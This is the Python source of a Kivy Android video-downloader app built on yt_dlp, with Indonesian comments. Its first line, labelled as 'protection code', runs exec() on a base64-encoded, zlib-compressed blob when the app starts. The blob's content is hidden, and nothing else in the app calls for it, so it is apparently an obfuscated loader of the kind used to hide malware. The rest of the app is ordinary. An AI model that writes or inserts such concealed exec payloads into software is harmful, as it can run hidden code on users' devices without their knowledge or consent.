# --- KODE PROTEKSI MAEL (Taruh di paling atas) ---
exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UMFKxDAQPTdfkVsSjEN3qcu6WEHEg4gIrjcRadNxDU2TkGS1Kv67G7J4meG9eTPzZvTkXUg0OjVikt9G97LvIq4aGVPYqySTnpC8uUBnqi0Nnd0hX9RiQ6oUvg6xim1phpL4Uh7x9uH67nX79HhzdS+yDpSzFlXinNWQlIfOg90FN4J2TC7W5+ulyMI+YDeSCmeFPuUN2QJEg+j5mSCmLc5gb32nRs4ub5mMEFB98EaI5/qFDO0RG0E+37VBatDyQVyYw7jh5L96WmhBcEbF8/EwoHKTDxgjL3+AftVkcsCslD8ssk38FeQPjc1i2Q==')[0])))

# --- LANJUT KE KODE APLIKASI UTAMA ---
from kivy.app import App
from kivy.uix.floatlayout import FloatLayout
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.uix.image import Image
from kivy.utils import platform
from kivy.clock import Clock
import os
import threading
import yt_dlp

class MaelSpeedApp(App):
    def build(self):
        # Izin Storage buat Android
        if platform == 'android':
            from android.permissions import request_permissions, Permission
            request_permissions([
                Permission.INTERNET,
                Permission.WRITE_EXTERNAL_STORAGE,
                Permission.READ_EXTERNAL_STORAGE
            ])

        root = FloatLayout()

        # Background Mael-Speed V2 Style
        bg_path = os.path.join('assets', 'background.jpg')
        if os.path.exists(bg_path):
            bg = Image(source=bg_path, allow_stretch=True, keep_ratio=False)
            root.add_widget(bg)

        ui = BoxLayout(orientation='vertical', padding=40, spacing=20)
        
        self.status_label = Label(
            text="MAEL-SPEED V3", 
            font_size='30sp', 
            color=(0, 1, 0, 1), 
            bold=True
        )
        ui.add_widget(self.status_label)
        
        self.url_input = TextInput(
            hint_text="Tempel Link Video...", 
            size_hint_y=None, 
            height='50dp', 
            multiline=False,
            background_color=(0,0,0,0.5), 
            foreground_color=(0,1,0,1)
        )
        ui.add_widget(self.url_input)
        
        self.btn = Button(
            text="GAS DOWNLOAD", 
            size_hint_y=None, 
            height='60dp', 
            background_color=(0, 0.7, 0, 1)
        )
        self.btn.bind(on_press=self.start_download_thread)
        ui.add_widget(self.btn)

        root.add_widget(ui)
        return root

    def start_download_thread(self, instance):
        link = self.url_input.text
        if not link:
            self.status_label.text = "LINK KOSONG, BOS!"
            return
            
        self.btn.disabled = True
        self.status_label.text = "LAGI PROSES..."
        threading.Thread(target=self.do_download, args=(link,), daemon=True).start()

    def do_download(self, link):
        try:
            # Simpan di folder Download HP
            download_path = '/sdcard/Download/MaelSpeed/%(title)s.%(ext)s'
            
            ydl_opts = {
                'outtmpl': download_path,
                'format': 'best',
            }
            
            with yt_dlp.YoutubeDL(ydl_opts) as ydl:
                ydl.download([link])
                
            Clock.schedule_once(lambda dt: self.finish_download("SUKSES TERDOWNLOAD!"))
        except Exception as e:
            Clock.schedule_once(lambda dt: self.finish_download(f"EROR: {str(e)[:20]}"))

    def finish_download(self, message):
        self.status_label.text = message
        self.btn.disabled = False
        self.url_input.text = ""

    def on_pause(self):
        return True

if __name__ == '__main__':
    MaelSpeedApp().run()

